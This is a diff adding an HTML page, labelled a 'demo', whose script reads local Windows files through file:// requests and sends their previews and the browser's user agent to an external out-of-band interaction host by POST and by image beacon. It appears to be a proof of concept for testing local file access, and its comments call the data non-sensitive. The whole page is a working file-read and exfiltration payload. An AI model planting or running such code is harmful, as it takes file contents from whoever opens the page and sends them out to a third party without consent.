@@ -1,0 +1,95 @@
+<html>
+<body>
+<h2>Local File Reader + External Pingback Demo</h2>
+<div id="output"></div>
+
+<script>
+(async function() {
+  const output = document.getElementById('output');
+  const pingbackUrl = 'https://48003a0a0673a30bd409guidijyyyyyyn.oast.pro';
+
+  // Helper: read a local file via XMLHttpRequest (file://)
+  function readLocalFile(url) {
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.onload = () => resolve(xhr.responseText);
+      xhr.onerror = () => reject(new Error('Failed to read: ' + url));
+      xhr.send();
+    });
+  }
+
+  // List of completely non‑sensitive files that exist on most Windows systems
+  const testFiles = [
+    'file:///C:/Windows/win.ini',                // harmless system settings
+    'file:///C:/Users/Public/Desktop/desktop.ini' // usually empty or trivial
+  ];
+
+  const results = [];
+
+  // Try to read each file and collect non‑sensitive samples
+  for (const fileUrl of testFiles) {
+    try {
+      const content = await readLocalFile(fileUrl);
+      // Take only first 100 chars (no tokens, just generic text)
+      const sample = content.substring(0, 100);
+      results.push({
+        file: fileUrl,
+        success: true,
+        size: content.length,
+        preview: sample
+      });
+      output.innerHTML += `<p style="color:green">✓ Read: ${fileUrl} (${content.length} bytes)</p>`;
+    } catch (err) {
+      results.push({ file: fileUrl, success: false, error: err.message });
+      output.innerHTML += `<p style="color:red">✗ Failed: ${fileUrl} - ${err.message}</p>`;
+    }
+  }
+
+  // Also demonstrate reading a user‑directory name (non‑sensitive example)
+  // We'll just simulate a username extracted from a typical path pattern.
+  const userDirectoryExample = 'C:/Users/bob bob (example)';
+  results.push({
+    info: 'User directory example',
+    path: userDirectoryExample,
+    note: 'This is a placeholder – real user directory would be read similarly.'
+  });
+  output.innerHTML += `<p>📁 User directory name (example): ${userDirectoryExample}</p>`;
+
+  // Build a safe pingback payload (no tokens, no passwords, no personal data)
+  const payload = {
+    event: 'file_read_demo',
+    timestamp: Date.now(),
+    userAgent: navigator.userAgent.slice(0, 80), // truncate, still non‑sensitive
+    files_attempted: results.map(r => ({
+      file: r.file,
+      success: r.success,
+      size: r.size || null,
+      preview: r.preview ? r.preview.slice(0, 50) : null
+    })),
+    user_directory_placeholder: userDirectoryExample
+  };
+
+  // Send pingback as JSON POST (no sensitive data)
+  output.innerHTML += '<p>📡 Sending pingback with non‑sensitive file metadata...</p>';
+
+  try {
+    const response = await fetch(pingbackUrl, {
+      method: 'POST',
+      mode: 'no-cors', // just fire and forget
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    output.innerHTML += '<p style="color:green">✓ Pingback sent (no‑cors mode).</p>';
+  } catch (err) {
+    output.innerHTML += `<p style="color:orange">⚠️ Pingback error: ${err.message}</p>`;
+  }
+
+  // Optional: also try an image beacon fallback
+  const img = new Image();
+  img.src = pingbackUrl + '?beacon=' + encodeURIComponent(JSON.stringify(payload).slice(0, 200));
+  output.innerHTML += '<p>📡 Also attempted Image beacon ping.</p>';
+})();
+</script>
+</body>
+</html>
